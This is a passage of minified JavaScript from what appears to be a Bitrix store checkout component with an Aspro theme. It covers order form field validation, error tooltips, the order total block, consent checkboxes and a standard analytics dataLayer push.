s,i,o=this.validation.properties[e],a=this.getValidationData(o,t);if(a&&a.inputs&&a.action)for(s=0;s<a.inputs.length;s++)if(BX.type.isElementNode(a.inputs[s]))BX.bind(a.inputs[s],a.action,BX.delegate((function(){this.isValidProperty(a)}),this));else for(i=0;i<a.inputs[s].length;i++)BX.bind(a.inputs[s][i],a.action,BX.delegate((function(){this.isValidProperty(a)}),this))}},getValidationData:function(e,t){if(e&&t){var s,i={};switch(e.TYPE){case"STRING":if(i.action="change",i.func=BX.delegate((function(t,s){return this.validateString(t,e,s)}),this),(s=t.querySelectorAll("input[type=text]")).length){i.inputs=s;break}(s=t.querySelectorAll("textarea")).length&&(i.inputs=s);break;case"LOCATION":if(i.func=BX.delegate((function(t,s){return this.validateLocation(t,e,s)}),this),(s=t.querySelectorAll("input.bx-ui-sls-fake[type=text]")).length){i.inputs=s,i.action="keyup";break}(s=t.querySelectorAll("div.bx-ui-slst-pool")).length&&(i.inputs=s);break;case"Y/N":i.inputs=t.querySelectorAll("input[type=checkbox]"),i.action="change",i.func=BX.delegate((function(t,s){return this.validateCheckbox(t,e,s)}),this);break;case"NUMBER":i.inputs=t.querySelectorAll("input[type=text]"),i.action="blur",i.func=BX.delegate((function(t,s){return this.validateNumber(t,e,s)}),this);break;case"ENUM":if((s=t.querySelectorAll("input[type=radio]")).length||(s=t.querySelectorAll("input[type=checkbox]")),s.length){i.inputs=[s],i.action="change",i.func=BX.delegate((function(t,s){return this.validateEnum(t,e,s)}),this);break}(s=t.querySelectorAll("option")).length&&(i.inputs=[s],i.action="click",i.func=BX.delegate((function(t,s){return this.validateSelect(t,e,s)}),this));break;case"FILE":i.inputs=t.querySelectorAll("input[type=file]"),i.action="change",i.func=BX.delegate((function(t,s){return this.validateFile(t,e,s)}),this);break;case"DATE":i.inputs=t.querySelectorAll("input[type=text]"),i.action="change",i.func=BX.delegate((function(t,s){return this.validateDate(t,e,s)}),this);break}return i}},getCountValidationErrorInLicensesBlock:function(){if(!this.licensesConditions.length)return 0;let e=0;return this.licensesConditions.forEach((t=>{t.querySelector("input").checked||(t.querySelector("label.error").classList.remove("hidden"),e++)})),e},showErrorTooltip:function(e,t,s){if(e&&t&&s){var i,o,a=BX("tooltip-"+e);s=this.uniqueText(s,"<br>"),a?i=a.querySelector("div.tooltip-inner"):(i=BX.create("DIV",{props:{className:"tooltip-inner"}}),a=BX.create("DIV",{props:{id:"tooltip-"+e,className:"bx-soa-tooltip bx-soa-tooltip-static bx-soa-tooltip-danger tooltip top"},children:[BX.create("DIV",{props:{className:"tooltip-arrow"}}),i]}),(o=t.parentNode.querySelector("div.quick-locations"))&&(t=o),BX.insertAfter(a,t)),i.innerHTML=s,"opened"!=a.getAttribute("data-state")&&(a.setAttribute("data-state","opened"),a.style.opacity=0,a.style.display="block",new BX.easing({duration:150,start:{opacity:0},finish:{opacity:100},transition:BX.easing.transitions.quad,step:function(e){a.style.opacity=e.opacity/100}}).animate())}},closeErrorTooltip:function(e){var t=BX("tooltip-"+e);t&&(t.setAttribute("data-state","closed"),new BX.easing({duration:150,start:{opacity:100},finish:{opacity:0},transition:BX.easing.transitions.quad,step:function(e){t.style.opacity=e.opacity/100},complete:function(){t.style.display="none"}}).animate())},showValidationResult:function(e,t){if(e&&e.length&&t){var s,i,o,a=BX.type.isElementNode(e[0])?e[0]:e[0][0],r=BX.findParent(a,{tagName:"DIV",className:"form-group"}).querySelector("label");for(r&&(s=r.getAttribute("for")),o=0;o<e.length;o++)i=BX.findParent(e[o],{tagName:"DIV",className:"form-group"}),t[o]&&t[o].length?BX.addClass(i,"has-error"):BX.removeClass(i,"has-error");t.length?this.showErrorTooltip(s,r,t.join("<br>")):this.closeErrorTooltip(s)}},validateString:function(e,t,s){if(!e||!t)return[];var i=e.value,o=[],a=BX.util.htmlspecialchars(t.NAME),r=s?BX.message("SOA_FIELD")+' "'+a+'"':BX.message("SOA_FIELD");return"Y"===t.MULTIPLE||("Y"===t.REQUIRED&&0===i.length&&o.push(r+" "+BX.message("SOA_REQUIRED")),i.length&&(t.MINLENGTH&&t.MINLENGTH>i.length&&o.push(BX.message("SOA_MIN_LENGTH")+' "'+a+'" '+BX.message("SOA_LESS")+" "+t.MINLENGTH+" "+BX.message("SOA_SYMBOLS")),t.MAXLENGTH&&t.MAXLENGTH<i.length&&o.push(BX.message("SOA_MAX_LENGTH")+' "'+a+'" '+BX.message("SOA_MORE")+" "+t.MAXLENGTH+" "+BX.message("SOA_SYMBOLS")),"Y"===t.IS_EMAIL&&(e.value=i=BX.util.trim(i),i.length&&(/^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i.test(i)||o.push(BX.message("SOA_INVALID_EMAIL")))),i.length>0&&t.PATTERN&&t.PATTERN.length&&(new RegExp(t.PATTERN).test(i)||o.push(r+" "+BX.message("SOA_INVALID_PATTERN"))))),o},validateLocation:function(e,t,s){if(!e||!t)return[];var i=BX.findParent(e,{tagName:"DIV",className:"form-group"}),o=this.getLocationString(i),a=[],r=s?BX.message("SOA_FIELD")+' "'+BX.util.htmlspecialchars(t.NAME)+'"':BX.message("SOA_FIELD");return"Y"==t.MULTIPLE&&"Y"!==t.IS_LOCATION||"Y"!=t.REQUIRED||0!=o.length&&o!=BX.message("SOA_NOT_SPECIFIED")||a.push(r+" "+BX.message("SOA_REQUIRED")),a},validateCheckbox:function(e,t,s){if(!e||!t)return[];var i=[],o=s?BX.message("SOA_FIELD")+' "'+BX.util.htmlspecialchars(t.NAME)+'"':BX.message("SOA_FIELD");return"Y"==t.MULTIPLE||"Y"!=t.REQUIRED||e.checked||i.push(o+" "+BX.message("SOA_REQUIRED")),i},validateNumber:function(e,t,s){if(!e||!t)return[];var i,o=e.value,a=[],r=BX.util.htmlspecialchars(t.NAME),l=s?BX.message("SOA_FIELD")+' "'+r+'"':BX.message("SOA_FIELD");return"Y"==t.MULTIPLE||("Y"==t.REQUIRED&&0==o.length&&a.push(l+" "+BX.message("SOA_REQUIRED")),o.length&&(/[0-9]|\./.test(o)||a.push(l+" "+BX.message("SOA_NOT_NUMERIC")),t.MIN&&parseFloat(t.MIN)>parseFloat(o)&&a.push(BX.message("SOA_MIN_VALUE")+' "'+r+'" '+parseFloat(t.MIN)),t.MAX&&parseFloat(t.MAX)<parseFloat(o)&&a.push(BX.message("SOA_MAX_VALUE")+' "'+r+'" '+parseFloat(t.MAX)),t.STEP&&parseFloat(t.STEP)>0&&(i=(Math.abs(parseFloat(o)-(t.MIN&&parseFloat(t.MIN)>0?parseFloat(t.MIN):0))/parseFloat(t.STEP)).toPrecision(12))!=parseInt(i)&&a.push(l+" "+BX.message("SOA_NUM_STEP")+" "+t.STEP))),a},validateEnum:function(e,t,s){if(!e||!t)return[];var i,o=[],a=[],r=s?BX.message("SOA_FIELD")+' "'+BX.util.htmlspecialchars(t.NAME)+'"':BX.message("SOA_FIELD");if("Y"==t.MULTIPLE)return a;for(i=0;i<e.length;i++)(e[i].checked||e[i].selected)&&o.push(i);return"Y"==t.REQUIRED&&0==o.length&&a.push(r+" "+BX.message("SOA_REQUIRED")),a},validateSelect:function(e,t,s){if(!e||!t)return[];var i,o=[],a=[],r=s?BX.message("SOA_FIELD")+' "'+BX.util.htmlspecialchars(t.NAME)+'"':BX.message("SOA_FIELD");if("Y"==t.MULTIPLE)return a;for(i=0;i<e.length;i++)e[i].selected&&o.push(i);return"Y"==t.REQUIRED&&0==o.length&&a.push(r+" "+BX.message("SOA_REQUIRED")),a},validateFile:function(e,t,s){if(!e||!t)return[];var i,o,a,r,l,n=[],c=e.files||[],p=s?BX.message("SOA_FIELD")+' "'+BX.util.htmlspecialchars(t.NAME)+'"':BX.message("SOA_FIELD"),h=e.previousSibling.value;if("Y"==t.MULTIPLE)return n;if("Y"!=t.REQUIRED||0!=c.length||""!=h||t.DEFAULT_VALUE&&t.DEFAULT_VALUE.length)for(i=0;i<c.length;i++)o=c[i],a=BX.util.htmlspecialchars(o.name),l=(r=o.name.split(".")).length>1?r[r.length-1].toLowerCase():"",t.ACCEPT.length>0&&(0==l.length||"-1"==t.ACCEPT.indexOf(l))&&n.push(BX.message("SOA_BAD_EXTENSION")+' "'+a+'" ('+BX.util.htmlspecialchars(t.ACCEPT)+")"),o.size>parseInt(t.MAXSIZE)&&n.push(BX.message("SOA_MAX_SIZE")+' "'+a+'" ('+this.getSizeString(t.MAXSIZE,1)+")");else n.push(p+" "+BX.message("SOA_REQUIRED"));return n},validateDate:function(e,t,s){if(!e||!t)return[];var i=e.value,o=[],a=BX.util.htmlspecialchars(t.NAME),r=s?BX.message("SOA_FIELD")+' "'+a+'"':BX.message("SOA_FIELD");return"Y"==t.MULTIPLE||"Y"==t.REQUIRED&&0==i.length&&o.push(r+" "+BX.message("SOA_REQUIRED")),o},editPropsMap:function(e){var t=BX.create("DIV",{props:{className:"col-sm-12"},style:{marginBottom:"10px"}}),s=BX.create("DIV",{props:{id:"propsMap"},style:{width:"100%"}});t.appendChild(s),e.appendChild(t)},editPropsComment:function(e){var t,s,i,o;t=BX.create("DIV",{props:{className:"col-sm-12"}}),s=BX.create("LABEL",{attrs:{for:"orderDescription"},props:{className:"bx-soa-customer-label"},html:this.params.MESS_ORDER_DESC}),i=BX.create("TEXTAREA",{props:{id:"orderDescription",cols:"4",className:"form-control bx-soa-customer-textarea bx-ios-fix",name:"ORDER_DESCRIPTION"},text:this.result.ORDER_DESCRIPTION?this.result.ORDER_DESCRIPTION:""}),o=BX.create("DIV",{props:{className:"form-group bx-soa-customer-field"},children:[s,i]});const a=BX.create("DIV",{props:{className:"bx-soa-pp-company-item group-without-margin"},children:[o]});t.appendChild(a),e.appendChild(t)},editTotalBlock:function(){if(this.totalInfoBlockNode&&this.result.TOTAL){var e,t,s,i,o,a,r,l=this.result.TOTAL,n={},c="Y"===this.params.SHOW_TOTAL_ORDER_BUTTON;if(BX.cleanNode(this.totalInfoBlockNode),this.fixStikerBlock(),0===parseFloat(l.ORDER_PRICE)?(e=this.params.MESS_PRICE_FREE,n.free=!0):e=l.ORDER_PRICE_FORMATED,this.options.showPayedFromInnerBudget?(this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_IT"),l.ORDER_TOTAL_LEFT_TO_PAY_FORMATED,{total:!0})),this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_PAYED"),'<span class="payed">'+l.PAYED_FROM_ACCOUNT_FORMATED+"</span>"))):this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_IT"),l.ORDER_TOTAL_PRICE_FORMATED,{total:!0})),this.result.SERVICES_IN_ORDER?(this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("ORDER_ITEMS_TITLE")+", "+l.ITEMS_COUNT+BX.message("ORDER_MEASURE_TITLE"),l.ITEMS_SUMM,n)),this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("ORDER_SERVICES_TITLE")+", "+this.result.SERVICES_ITEMS.COUNT+BX.message("ORDER_MEASURE_TITLE"),this.result.SERVICES_ITEMS.SUMM_FORMATTED,n))):(BX.message("SOA_SUM_SUMMARY"),this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_SUMMARY"),e,n))),this.options.showOrderWeight&&this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_WEIGHT_SUM"),l.ORDER_WEIGHT_FORMATED)),this.options.showTaxList)for(i=0;i<l.TAX_LIST.length;i++)s=l.TAX_LIST[i].VALUE_MONEY_FORMATED||"",this.totalInfoBlockNode.appendChild(this.createTotalUnit(l.TAX_LIST[i].NAME+(l.TAX_LIST[i].VALUE_FORMATED?" "+l.TAX_LIST[i].VALUE_FORMATED:"")+":",s));if(n={},(a=(o=this.getSelectedDelivery())&&o.CALCULATE_ERRORS&&o.CALCULATE_ERRORS.length)?(r=BX.message("SOA_NOT_CALCULATED"),n.error=a):0===parseFloat(l.DELIVERY_PRICE)?(r=this.params.MESS_PRICE_FREE,n.free=!0):r=l.DELIVERY_PRICE_FORMATED,this.result.DELIVERY.length&&this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_DELIVERY"),r,n)),this.options.showDiscountPrice&&(t=this.params.MESS_ECONOMY,l.DISCOUNT_PERCENT_FORMATED&&parseFloat(l.DISCOUNT_PERCENT_FORMATED)>0&&(t+=l.DISCOUNT_PERCENT_FORMATED),this.totalInfoBlockNode.appendChild(this.createTotalUnit(t+":",l.DISCOUNT_PRICE_FORMATED,{highlighted:!0}))),parseFloat(l.PAY_SYSTEM_PRICE)>=0&&this.result.DELIVERY.length&&this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_PAYSYSTEM_PRICE"),"~"+l.PAY_SYSTEM_PRICE_FORMATTED)),!this.result.SHOW_AUTH){"Y"===this.params.SHOW_COUPONS&&this.editCoupons(this.totalInfoBlockNode),this.showTotalDeliveryInfo(),this.showTotalPaymentInfo(),this.totalInfoBlockNode.appendChild(BX.create("DIV",{props:{className:"bx-soa-cart-total-button-container lic_condition"+(c?"":" visible-xs")},children:[BX.create("A",{props:{href:"javascript:void(0)",className:"btn btn-default btn-lg btn-order-save"},html:this.params.MESS_ORDER,events:{click:BX.proxy(this.clickOrderSaveAction,this)}})]}));const e=(e="")=>{let t=BX.create("div");return t.innerHTML=e,t.firstElementChild};if(this.licensesConditions.length||("Y"==arAsproOptions.THEME.SHOW_LICENCE&&appAspro.userConsent&&appAspro.userConsent.licenceBlock&&this.licensesConditions.push(e(appAspro.userConsent.licenceBlock)),"Y"==arAsproOptions.THEME.SHOW_OFFER&&appAspro.userConsent&&appAspro.userConsent.offerBlock&&this.licensesConditions.push(e(appAspro.userConsent.offerBlock))),this.licensesConditions.length&&!this.totalBlockNode.querySelector(".bx-soa-cart-conditions")){this.totalBlockNode.querySelector(".bx-soa-total-wrapper").appendChild(BX.create("DIV",{props:{className:"bx-soa-cart-conditions mt mt--24"},children:[BX.create("div",{props:{className:"bx-soa-cart-conditions-text font_xs "},children:this.licensesConditions})]})),BX.UserConsent?.loadFromForms(),document.querySelectorAll(".bx-soa-cart-conditions input[type=checkbox]").forEach((e=>{BX.bind(e,"change",(function(e){const t=e.target;if(t.checked){const e=t.closest(".form-checkbox");if(e){const t=e.querySelector("label.error");t&&t.classList.add("hidden")}}}))}))}}this.editMobileTotalBlock()}},fixStikerBlock:function(){var e=this.totalBlockNode.querySelector(".bx-soa-total-wrapper");if("Y"===arAsproOptions.THEME.TOP_MENU_FIXED){e.classList.add("sticky_top");let t=document.querySelector("#header");document.querySelector("#headerfixed > div")&&(t=document.querySelector("#headerfixed")),t&&(e.style.top=t.clientHeight-2+"px")}},editMobileTotalBlock:function(){this.result.SHOW_AUTH?BX.removeClass(this.mobileTotalBlockNode,"visible-xs"):BX.addClass(this.mobileTotalBlockNode,"visible-xs"),BX.cleanNode(this.mobileTotalBlockNode),this.mobileTotalBlockNode.appendChild(this.totalInfoBlockNode.cloneNode(!0)),BX.bind(this.mobileTotalBlockNode.querySelector("a.bx-soa-price-not-calc"),"click",BX.delegate((function(){this.animateScrollTo(this.deliveryBlockNode)}),this)),BX.bind(this.mobileTotalBlockNode.querySelector("a.btn-order-save"),"click",BX.proxy(this.clickOrderSaveAction,this))},showTotalDeliveryInfo:function(){const e=this.getSelectedDelivery();if(e&&(this.totalInfoBlockNode.appendChild(this.createTotalScrollInfo(BX.message("ORDER_TOTAL_DELIVERY_TITLE"),e.NAME,this.deliveryBlockNode)),e.PERIOD_TEXT)){let t=e.PERIOD_TEXT;const s=document.createElement("div");s.innerHTML=t;const i=s.querySelectorAll("select, input, button, iframe, a, br, hr, img");if(i){for(let e=i.length-1;e>-1;e--)BX.remove(i[e]);t=s.innerHTML.replace(/<[^/>][^>]*><\/[^>]+>/g,"").trim()}this.totalInfoBlockNode.appendChild(BX.create("div",{props:{className:"total-delivery-info font_13"},text:t}))}},showTotalPaymentInfo:function(){const e=this.getSelectedPaySystem();e&&this.totalInfoBlockNode.appendChild(this.createTotalScrollInfo(BX.message("ORDER_TOTAL_PAYMENT_TITLE"),e.NAME,this.paySystemBlockNode))},createTotalScrollInfo:function(e,t,s){return BX.create("div",{props:{className:"total-scroll-info font_13"},children:[BX.create("div",{props:{className:"total-scroll-info__title"},text:e+":"}),BX.create("div",{props:{className:"total-scroll-info__value"+(s.classList.contains("hidden")?" ":" colored_theme_text_with_hover wborder")},html:"<span>"+t+"</span>",events:{click:BX.delegate((function(){s.classList.contains("hidden")||this.animateScrollTo(s)}),this)}})]})},createTotalUnit:function(e,t,s){var i,o="bx-soa-cart-total-line";return e=e||"",t=t||"",i=(s=s||{}).error?[BX.create("A",{props:{className:"bx-soa-price-not-calc"},html:t,events:{click:BX.delegate((function(){this.animateScrollTo(this.deliveryBlockNode)}),this)}})]:s.free?[BX.create("SPAN",{props:{className:"bx-soa-price-free"},html:t})]:[t],s.total&&(o+=" bx-soa-cart-total-line-totals"),s.highlighted&&(o+=" bx-soa-cart-total-line-highlighted"),BX.create("DIV",{props:{className:o},children:[BX.create("SPAN",{props:{className:"bx-soa-cart-t"},text:e}),BX.create("SPAN",{props:{className:"bx-soa-cart-d"+(s.total&&this.options.totalPriceChanged?" bx-soa-changeCostSign":"")},children:i})]})},basketBlockScrollCheckEvent:function(e){var t=e.target||e.srcElement,s=t.scrollLeft,i=t.scrollWidth-(s+t.clientWidth),o=t.parentNode;0==s?BX.removeClass(o,"bx-soa-table-fade-left"):BX.addClass(o,"bx-soa-table-fade-left"),0==i?BX.removeClass(o,"bx-soa-table-fade-right"):BX.addClass(o,"bx-soa-table-fade-right")},basketBlockScrollCheck:function(){var e,t,s,i,o,a,r,l,n=this.orderBlockNode.querySelectorAll("div.bx-soa-table-fade"),c=!1;for(o=0;o<n.length;o++)s=(e=n[o]).querySelector("table.bx-soa-item-table"),t=e.clientWidth,i=s.clientWidth||0,(c=c||i>t)?(r=(a=BX.firstChild(e)).scrollLeft,l=a.scrollWidth-(r+a.clientWidth),0==r?BX.removeClass(e,"bx-soa-table-fade-left"):BX.addClass(e,"bx-soa-table-fade-left"),0==l?BX.removeClass(e,"bx-soa-table-fade-right"):BX.addClass(e,"bx-soa-table-fade-right"),0==r&&0==l&&BX.addClass(e,"bx-soa-table-fade-right")):BX.removeClass(e,"bx-soa-table-fade-left bx-soa-table-fade-right")},totalBlockScrollCheck:function(){if(this.totalInfoBlockNode&&this.totalGhostBlockNode){var e,t=BX.GetWindowScrollPos().scrollTop,s=BX.pos(this.totalGhostBlockNode).top,i=BX.pos(this.orderBlockNode).bottom,o=0,a=BX("headerfixed");a&&BX.hasClass(a,"fixed")&&(o=a.offsetHeight+20),i-this.totalBlockNode.offsetHeight<t+20?BX.addClass(this.totalInfoBlockNode,"bx-soa-cart-total-bottom"):BX.removeClass(this.totalInfoBlockNode,"bx-soa-cart-total-bottom"),t+o>s&&!BX.hasClass(this.totalInfoBlockNode,"bx-soa-cart-total-fixed")?(e=this.totalInfoBlockNode.offsetWidth,BX.addClass(this.totalInfoBlockNode,"bx-soa-cart-total-fixed"),this.totalGhostBlockNode.style.paddingTop=this.totalInfoBlockNode.offsetHeight+"px",this.totalInfoBlockNode.style.width=e+"px"):t+o<s&&BX.hasClass(this.totalInfoBlockNode,"bx-soa-cart-total-fixed")&&(BX.removeClass(this.totalInfoBlockNode,"bx-soa-cart-total-fixed"),this.totalGhostBlockNode.style.paddingTop=0,this.totalInfoBlockNode.style.width="")}},totalBlockResizeCheck:function(){this.totalInfoBlockNode&&this.totalGhostBlockNode&&BX.hasClass(this.totalInfoBlockNode,"bx-soa-cart-total-fixed")&&(this.totalInfoBlockNode.style.width=this.totalGhostBlockNode.offsetWidth+"px")},totalBlockFixFont:function(){var e,t,s=this.totalInfoBlockNode.querySelector(".bx-soa-cart-total-line.bx-soa-cart-total-line-totals"),i=[];s&&(t=BX.lastChild(s),i.push({node:t,maxFontSize:28,smallestValue:!1,scaleBy:t.parentNode})),"Y"==this.params.SHOW_TOTAL_ORDER_BUTTON&&(e=this.totalInfoBlockNode.querySelector(".bx-soa-cart-total-button-container"))&&(t=BX.lastChild(e),i.push({node:t,maxFontSize:18,smallestValue:!1})),i.length&&BX.FixFontSize.init({objList:i,onAdaptiveResize:!0})},setAnalyticsDataLayer:function(e,t){if(this.params.DATA_LAYER_NAME){var s,i,o,a,r=[];for(i in this.result.GRID.ROWS)if(this.result.GRID.ROWS.hasOwnProperty(i)){for(a=this.result.GRID.ROWS[i],o=[],i=0;i<a.data.PROPS.length;i++)o.push(a.data.PROPS[i].VALUE);r.push({id:a.data.PRODUCT_ID,name:a.data.NAME,price:a.data.PRICE,brand:(a.data[this.params.BRAND_PROPERTY+"_VALUE"]||"").split(", ").join("/"),variant:o.join("/"),quantity:a.data.QUANTITY})}switch(e){case"checkout":s={event:"checkout",ecommerce:{checkout:{products:r}}};break;case"purchase":s={event:"purchase",ecommerce:{purchase:{actionField:{id:t,revenue:this.result.TOTAL.ORDER_TOTAL_PRICE,tax:this.result.TOTAL.TAX_PRICE,shipping:this.result.TOTAL.DELIVERY_PRICE},products:r}}};break}window[this.params.DATA_LAYER_NAME]=window[this.params.DATA_LAYER_NAME]||[],window[this.params.DATA_LAYER_NAME].push(s)}},isOrderSaveAllowed:function(){return!0===this.orderSaveAllowed},allowOrderSave:function(){this.orderSaveAllowed=!0},disallowOrderSave:function(){this.orderSaveAllowed=!1},initUserConsent:function(){BX.ready(BX.delegate((function(){var e=BX.UserConsent&&BX.UserConsent.load(this.orderBlockNode);e&&(BX.addCustomEvent(e,BX.UserConsent.events.save,BX.proxy(this.doSaveAction,this)),BX.addCustomEvent(e,BX.UserConsent.events.refused,BX.proxy(this.disallowOrderSave,this)))}),this))},hasUserProfiles:function(){return!(!this.result.USER_PROFILES||!BX.util.object_keys(this.result.USER_PROFILES).length)}}}();